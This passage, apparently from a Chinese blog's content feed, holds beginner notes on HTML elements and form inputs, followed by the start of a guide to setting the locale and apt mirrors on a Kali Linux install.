<h6 id="在本窗口-窗口主框架-打开"><a href="#在本窗口-窗口主框架-打开" class="headerlink" title="在本窗口(窗口主框架)打开"></a>在本窗口(窗口主框架)打开</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_top&quot;&gt;访问菜鸟教程!&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710317.png"></p>
<h6 id="在新窗口打开"><a href="#在新窗口打开" class="headerlink" title="在新窗口打开"></a>在新窗口打开</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_blank&quot;&gt;访问菜鸟教程!&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h6 id="邮箱链接（mailto链接）"><a href="#邮箱链接（mailto链接）" class="headerlink" title="邮箱链接（mailto链接）"></a>邮箱链接（mailto链接）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;mailto:someone@example.com?subject=邮件主题&amp;body=邮件内容&quot;&gt;发送邮件&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><code>mailto:someone@example.com</code> 是收件人的邮箱地址。</p>
<p><code>subject=邮件主题</code> 是邮件的主题。</p>
<p><code>body=邮件内容</code> 是邮件的正文内容。</p>
<h5 id="id"><a href="#id" class="headerlink" title="id"></a>id</h5><p>id 属性可用于创建一个 HTML 文档书签。</p>
<p><strong>提示:</strong> 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p>
<p>实例</p>
<h6 id="在本页面中创建一个链接到”有用的提示部分"><a href="#在本页面中创建一个链接到”有用的提示部分" class="headerlink" title="在本页面中创建一个链接到”有用的提示部分"></a>在本页面中创建一个链接到”有用的提示部分</h6><p>在HTML文档中插入ID</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h6 id="在另一个页面创建一个链接到”有用的提示部分"><a href="#在另一个页面创建一个链接到”有用的提示部分" class="headerlink" title="在另一个页面创建一个链接到”有用的提示部分"></a>在另一个页面创建一个链接到”有用的提示部分</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a>HTML 图像</h3><img src="pulpit.jpg" alt="Pulpit rock" width="304" height="228">

<h4 id="图像标签（-）和源属性（Src）"><a href="#图像标签（-）和源属性（Src）" class="headerlink" title="图像标签（ &lt;img&gt;）和源属性（Src）"></a>图像标签（ <code>&lt;img&gt;</code>）和源属性（Src）</h4><p>在 HTML 中，图像由<code>&lt;img&gt;</code> 标签定义，<code>&lt;img&gt;</code> 是空标签，它只包含属性，没有闭合标签。</p>
<p>要在页面上显示图像，你需要使用源属性（src） “source”，其的值是图像的 URL 地址（URL 指存储图像的位置。如果名为 “pulpit.jpg” 的图像位于 <a href="http://www.runoob.com/">www.runoob.com</a> 的 images 目录中，那么其 URL 为 <a href="https://www.runoob.com/images/pulpit.jpg">http://www.runoob.com/images/pulpit.jpg</a>。）</p>
<h4 id="Alt属性"><a href="#Alt属性" class="headerlink" title="Alt属性"></a>Alt属性</h4><p>alt 属性用来为图像定义一串预备的可替换的文本。替换文本属性的值是用户定义的</p>
<h4 id="图像的高度与宽度"><a href="#图像的高度与宽度" class="headerlink" title="图像的高度与宽度"></a>图像的高度与宽度</h4><p>height（高度） 与 width（宽度）属性用于设置图像的高度与宽度</p>
<h4 id="创建图像映射"><a href="#创建图像映射" class="headerlink" title="创建图像映射"></a>创建图像映射</h4><p>带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710318.png"></p>
<p>解释：</p>
<p>1.map</p>
<p>每个 <code>area</code> 元素可以有以下属性：</p>
<p>**<code>shape</code>**：定义区域的形状，可以是 <code>rect</code>（矩形）、<code>circle</code>（圆形）、<code>poly</code>（多边形）或 <code>default</code>（默认区域）。</p>
<p>**<code>coords</code>**：定义区域的坐标，取决于区域的形状。</p>
<p>**<code>href</code>**：定义当用户点击这个区域时将导航到的 URL。</p>
<p>**<code>alt</code>**：提供区域的替代文本，有助于无障碍访问。</p>
<p>**<code>target</code>**：指定链接打开的目标窗口或框架。</p>
<p>2.<code>coords</code> 属性用于定义一个区域（通常是图像地图中的热点区域）的坐标。图像地图允许你将一个图像分割成多个可点击的区域，每个区域都链接到不同的 URL 或触发不同的动作。</p>
<p><code>coords</code> 属性的值是一个由数字组成的字符串，数字之间用逗号分隔。这些数字代表热点区域的坐标。对于不同的 <code>shape</code> 值，<code>coords</code> 属性的格式会有所不同：</p>
<p>**<code>rect</code>**：左上角的 x 和 y 坐标，右下角的 x 和 y 坐标。</p>
<p>**<code>circle</code>**：圆心的 x 和 y 坐标，然后是半径。</p>
<p>**<code>poly</code>**：多边形每个顶点的 x 和 y 坐标，顶点坐标依次排列。</p>
<h3 id="HTML头部"><a href="#HTML头部" class="headerlink" title="HTML头部"></a>HTML头部</h3><p>在 <code>&lt;head&gt;</code>元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。可以添加在头部区域的元素标签为: <code>&lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt;</code> 和 <code>&lt;base&gt;</code></p>
<h4 id="元素-title"><a href="#元素-title" class="headerlink" title="**&lt;title&gt;**元素(title)"></a>**<code>&lt;title&gt;</code>**元素(title)</h4><p>标签定义了不同文档的标题,在 HTML&#x2F;XHTML 文档中是必需的,</p>
<p>定义了浏览器工具栏的标题</p>
<p>显示在收藏夹中的标题</p>
<p>显示在搜索引擎结果页面的标题</p>
<h4 id="元素-base"><a href="#元素-base" class="headerlink" title="&lt;base&gt;元素(base)"></a><code>&lt;base&gt;</code>元素(base)</h4><p>描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接:</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710319.png"></p>
<h4 id="元素-link"><a href="#元素-link" class="headerlink" title="&lt;link&gt; 元素(link)"></a><code>&lt;link&gt;</code> 元素(link)</h4><p>标签定义了文档与外部资源之间的关系，通常用于链接到样式表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt; &lt;/head&gt;</span><br></pre></td></tr></table></figure>

<h4 id="元素-style"><a href="#元素-style" class="headerlink" title="&lt;style&gt; 元素(style)"></a><code>&lt;style&gt;</code> 元素(style)</h4><p>定义了HTML文档的样式文件引用地址，在<code>&lt;style&gt;</code> 元素中也可以直接添加样式来渲染 HTML 文档:</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710320.png"></p>
<h4 id="元素-meta"><a href="#元素-meta" class="headerlink" title="&lt;meta&gt; 元素(meta)"></a><code>&lt;meta&gt;</code> 元素(meta)</h4><p>META 元素（一般放在<code>&lt;head&gt;</code>）用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据（元数据也不显示在页面上，但会被浏览器解析）元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710321.png"></p>
<h4 id="元素-script"><a href="#元素-script" class="headerlink" title="&lt;script&gt; 元素(script)"></a><code>&lt;script&gt;</code> 元素(script)</h4><p>用于加载脚本文件，如： JavaScript</p>
<h3 id="HTML-CSS"><a href="#HTML-CSS" class="headerlink" title="HTML CSS"></a>HTML CSS</h3><p>CSS 可以通过以下方式添加到HTML中:</p>
<p>内联样式- 在HTML元素中使用”style” <strong>属性</strong></p>
<p>内部样式表 -在HTML文档头部 <code>&lt;head&gt;</code> 区域使用<code>&lt;style&gt;</code> <strong>元素</strong> 来包含CSS</p>
<p>外部引用 - 使用外部 CSS <strong>文件</strong></p>
<h4 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h4><p>background-color（背景色属性）定义一个元素的背景颜色</p>
<p>font-family（字体），color（颜色），和font-size（字体大小）属性定义字体的样式</p>
<p> text-align（文字对齐）属性指定文本的水平与垂直对齐方式</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710322.png"></p>
<h4 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h4><p>当单个文件需要特别样式时，就可以使用内部样式表</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710323.png"></p>
<h4 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h4><p>当样式需要被应用到很多页面的时候，使用外部样式表，可以通过更改一个文件来改变整个站点的外观。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710324.png" alt="屏幕截图 2024-09-27 093933"></p>
<h3 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h3><p>由 <strong><code>&lt;table&gt;</code></strong> 标签来定义。是一种用于展示结构化数据的标记语言元素。</p>
<p><strong>tr</strong>：tr 是 table row 的缩写，表示表格的一行。</p>
<p><strong>td</strong>：td 是 table data 的缩写，表示表格的数据单元格（每行被分割为若干单元格）</p>
<p><strong>th</strong>：th 是 table header的缩写，表示表格的表头单元格。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710325.png"></p>
<p>如果不定义边框属性，表格将不显示边框<code>&lt;table border=&quot;0&quot;&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710326.png"></p>
<p><code>&lt;tfoot &gt;</code> 可用于在表格的底部定义摘要、统计信息等内容。 <code>&lt;caption &gt;</code> 可用于为整个表格定义标题。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710327.png">跨行或跨列的表格单元格</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710328.png"></p>
<p>cellspacing&#x3D;”10”&#x3D;&#x3D;单元格间距&#x3D;”10”</p>
<p>cellpadding&#x3D;”10”&#x3D;&#x3D;单元格边距&#x3D;“10”</p>
<h3 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h3><h4 id="HTML无序列表"><a href="#HTML无序列表" class="headerlink" title="HTML无序列表"></a>HTML无序列表</h4><p>无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。</p>
<p>无序列表使用 <strong><code>&lt;ul&gt;</code></strong> 标签定义，表示项目之间没有顺序关系。列表项用 <strong><code>&lt;li&gt;</code></strong> 标签表示</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710329.png"></p>
<h4 id="HTML-有序列表"><a href="#HTML-有序列表" class="headerlink" title="HTML 有序列表"></a>HTML 有序列表</h4><p>列表项目使用数字进行标记。 有序列表始于 <strong><code>&lt;ol&gt;</code></strong> 标签。每个列表项始于 <strong><code>&lt;li&gt;</code></strong> 标签。</p>
<p>列表项使用数字来标记。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710331.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250122163913390.png"></p>
<h4 id="HTML-自定义列表"><a href="#HTML-自定义列表" class="headerlink" title="HTML 自定义列表"></a>HTML 自定义列表</h4><p>自定义列表不仅仅是一列项目，而是项目及其注释的组合。</p>
<p>自定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code> 开始。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710333.png" alt="屏幕截图 2024-09-27 232500"></p>
<h3 id="HTML-布局"><a href="#HTML-布局" class="headerlink" title="HTML 布局"></a>HTML 布局</h3><h4 id="使用-元素"><a href="#使用-元素" class="headerlink" title="使用&lt;div&gt; 元素"></a>使用<code>&lt;div&gt;</code> 元素</h4><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710334.png"></p>
<h4 id="使用表格"><a href="#使用表格" class="headerlink" title="使用表格"></a>使用表格</h4><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710335.png"></p>
<h3 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h3><p>HTML 表单用于收集用户的输入信息，如：文本域（textarea）、下拉列表（select）、单选框（radio-buttons）、复选框（checkbox） 等等。表示文档中的一个区域，此区域包含交互控件，将用户收集到的信息发送到 Web 服务器。通常包含各种输入字段、复选框、单选按钮、下拉列表等元素。</p>
<p><code>&lt;form&gt;</code> 元素用于创建表单</p>
<p><code>action</code> 属性定义了表单数据提交的目标 URL</p>
<p><code>method</code> 属性定义了提交数据的 HTTP 方法（这里使用的是 “post”）。</p>
<p><code>&lt;label&gt;</code> 元素用于<strong>为表单元素添加标签</strong>，提高可访问性。</p>
<p><code>&lt;input&gt;</code> 元素是最常用的表单元素之一，它可以<strong>创建文本输入框、密码框、单选按钮、复选框</strong>等。</p>
<p><code>type</code> 属性定义了输入框的类型，</p>
<p><strong><code>id</code> 属性为 HTML 元素分配唯一标识符，用于关联 <code>&lt;label&gt;</code> 元素</strong>，<code>id</code> 则仅用于前端操作。一个页面中每个 <code>id</code> <strong>必须唯一</strong>，通过 JavaScript 或 CSS 可以快速定位特定元素</p>
<p><code>class</code> 属性为 HTML 元素分配一个或多个类名，用于分组和样式控制</p>
<p><code>name</code> 属性用于标识表单字段，是表单提交的关键，</p>
<p><code>value</code> 用于为表单字段设置默认值&#x2F;当前值当用户提交表单时，<code>value</code> 的值将作为该字段的值被发送到服务器</p>
<p><code>value</code> 和 <code>name</code> 通常是同时使用的，<code>name</code> 指定字段的名称（键名），<code>value</code> 指定字段的值。</p>
<p><code>&lt;select&gt;</code> 元素用于创建下拉列表，而 <code>&lt;option&gt;</code> 元素用于定义下拉列表中的选项。</p>
<p><code>required</code>指定此输入框为必填字段。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710336.png"></p>
<h4 id="输入类型"><a href="#输入类型" class="headerlink" title="输入类型"></a>输入类型</h4><ol>
<li><p><strong>文本输入</strong> (<code>&lt;input type=&quot;text&quot;&gt;</code>): 允许用户输入文本。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>placeholder</code>提供输入提示，不会作为字段的实际值提交到服务器。</p>
<p>附：文本域（拉右下角可移动）：用户可在文本域中写入文本。可写入字符的字数不受限制。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710337.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710338.png"></p>
</li>
<li><p><strong>密码输入</strong> (<code>&lt;input type=&quot;password&quot;&gt;</code>): 用于输入密码，输入内容会显示为点或星号。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>电子邮件输入</strong> (<code>&lt;input type=&quot;email&quot;&gt;</code>): 用于输入电子邮件地址，会自动验证电子邮件格式。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your email&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>数字输入</strong> (<code>&lt;input type=&quot;number&quot;&gt;</code>): 用于输入数字，可以包括小数点和负数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Your age&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>搜索框</strong> (<code>&lt;input type=&quot;search&quot;&gt;</code>): 用于搜索，通常会显示为一个搜索框。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Search...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>单选按钮</strong> (<code>&lt;input type=&quot;radio&quot;&gt;</code>): 允许用户在一组选项中选择一个。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710339.png"></p>
</li>
<li><p><strong>复选框</strong> (<code>&lt;input type=&quot;checkbox&quot;&gt;</code>): 允许用户选择多个选项。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710340.png"></p>
</li>
<li><p><strong>下拉列表</strong>下拉列表框是一个可选列表。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710341.png"></p>
<p>如果预选a，则<code>&lt;option value=&quot;a&quot; selected&gt;a&lt;/option&gt;</code></p>
</li>
<li><p><strong>提交按钮</strong> (<code>&lt;input type=&quot;submit&quot;&gt;</code>): 提交表单数据。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>重置按钮</strong> (<code>&lt;input type=&quot;reset&quot;&gt;</code>): 重置表单输入字段为初始值。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Reset&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>隐藏输入</strong> (<code>&lt;input type=&quot;hidden&quot;&gt;</code>): 用于隐藏数据，用户不可见。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hiddenField&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hiddenValue&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>文件上传</strong> (<code>&lt;input type=&quot;file&quot;&gt;</code>): 允许用户上传文件。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fileUpload&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>按钮</strong> (<code>&lt;input type=&quot;button&quot;&gt;</code>): 创建一个可点击的按钮，但不会提交表单。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>颜色选择器</strong> (<code>&lt;input type=&quot;color&quot;&gt;</code>): 允许用户选择颜色。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;favcolor&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#ff0000&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>日期选择器</strong> (<code>&lt;input type=&quot;date&quot;&gt;</code>): 允许用户选择日期。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birthday&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>时间选择器</strong> (<code>&lt;input type=&quot;time&quot;&gt;</code>): 允许用户选择时间。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>日期和时间选择器</strong> (<code>&lt;input type=&quot;datetime-local&quot;&gt;</code>): 允许用户选择日期和时间。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">name</span>=<span class="string">&quot;eventtime&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>月选择器</strong> (<code>&lt;input type=&quot;month&quot;&gt;</code>): 允许用户选择月份和年份。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;month&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birthdate&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>周选择器</strong> (<code>&lt;input type=&quot;week&quot;&gt;</code>): 允许用户选择一周。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;week&quot;</span> <span class="attr">name</span>=<span class="string">&quot;week&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>这些输入元素可以包含在 <code>&lt;form&gt;</code> 元素中，并且可以通过 <code>&lt;form&gt;</code> 元素的 <code>action</code> 属性指定提交数据的 URL，通过 <code>method</code> 属性指定提交数据的方式（通常是 <code>GET</code> 或 <code>POST</code>）。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 输入元素放在这里 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，当用户填写用户名并点击提交按钮时，表单数据将通过 POST 方法发送到 <code>/submit-form</code> URL。</p>
<h3 id="HTML框架"><a href="#HTML框架" class="headerlink" title="HTML框架"></a>HTML框架</h3><p>通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。</p>
<h4 id="iframe语法"><a href="#iframe语法" class="headerlink" title="iframe语法"></a><strong>iframe语法</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;URL&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h4 id="iframe作用"><a href="#iframe作用" class="headerlink" title="iframe作用"></a>iframe作用</h4><h5 id="设置高度与宽度"><a href="#设置高度与宽度" class="headerlink" title="设置高度与宽度"></a>设置高度与宽度</h5><h5 id="移除边框"><a href="#移除边框" class="headerlink" title="移除边框"></a>移除边框</h5><p>frameborder 属性定义iframe表示是否显示边框。设置属性值为 “0” 移除iframe的边框</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710342.png"></p>
<h5 id="显示目标链接页面"><a href="#显示目标链接页面" class="headerlink" title="显示目标链接页面"></a>显示目标链接页面</h5><p>iframe 可以显示一个目标链接的页面</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710343.png"></p>
<h3 id="HTML-脚本（JavaScript）"><a href="#HTML-脚本（JavaScript）" class="headerlink" title="HTML 脚本（JavaScript）"></a>HTML 脚本（JavaScript）</h3><h3 id="HTML-速查列表"><a href="#HTML-速查列表" class="headerlink" title="HTML 速查列表"></a>HTML 速查列表</h3><p>[][HTML 速查列表 | 菜鸟教程 (runoob.com)]<a href="https://www.runoob.com/html/html-quicklist.html">https://www.runoob.com/html/html-quicklist.html</a></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710344.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710345.png" alt="屏幕截图 2024-09-29 134354"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710346.png" alt="屏幕截图 2024-09-29 134404"></p>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
</head>
<body>
<h1>表单</h1>
<fieldset>
    <!--搜索框-->
    <label for="search">搜索</label>
    <input type="search" id="search" name="search" required>
</fieldset>
<fieldset>
<form action="/submit_form" method="post">
    <!--文本输入框-->
    <label for="name">用户名</label>
    <input type="text" id="name" name="name" required>
    <br>
    <!--密码输入框-->
    <label for="password">密码</label>
    <input type="password" id="password" name="password" required >
    <br>
    <!--邮箱输入框-->
    <label for="email">邮箱</label>
    <input type="email" id="email" name="email" required>
    <br>
    <!--单选按钮-->
    <label>性别</label>
    <input type="radio" id="male" name="gender" value="male"checked>
    <label for="male">男</label>
    <input type="radio" id="female" name="gender" value="female">
    <label for="female">女</label>
    <br>
    <!--复选框-->
    <input type="checkbox" id="sub" name="sub" checked>
    <label for="sub">订阅推送信息</label>
    <br>
    <!--下拉列表-->
    <label for="country">国家</label>
    <select id="country" name="country">
        <option value="cn">CN</option>
        <option value="usa">USA</option>
        <option value="uk">UK</option>
    </select>
    <br>
    <!--重置按钮-->
    <input type="reset" value="重置">
    <!--提交按钮-->
    <input type="submit" value="提交">	
</form>
</fieldset>
<fieldset>
    <!--文件上传-->
    <input type="file" name=fileupload accept=".jpg,.png,.pdf">
    <br>
    <!--提交按钮-->
    <input type="submit" value="上传">
</fieldset>
<fieldset>
    <!--日期和时间选择器-->
    <input type="datetime-local" name=eventtime>
</fieldset>	
</body>
</html>


]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>kali优化</title>
    <url>/2025/02/05/kali%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="kali优化"><a href="#kali优化" class="headerlink" title="kali优化"></a>kali优化</h1><p><strong>kali解压打开默认密码为：kali</strong></p>
<h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a><strong>设置中文</strong></h2><p>打开Terminal，输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>

<p>进入后使用键盘的↑+↓←，到最底部，找到 <code>[ ] zh_CN.UTF-8 UTF-8</code> ，按空格键选中，再按回车进入下一个页面，再选中 <code>zh_CN.UTF-8</code>作为默认语言，后回车</p>
<p>等待下载结束后重启即可</p>
<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a><strong>换源</strong></h2><p>因为官方源都是的速度慢，所以选择换国内源</p>
<p>打开Terminal，输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>可选的国内源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib</span><br><span class="line">#浙大源</span><br><span class="line">deb 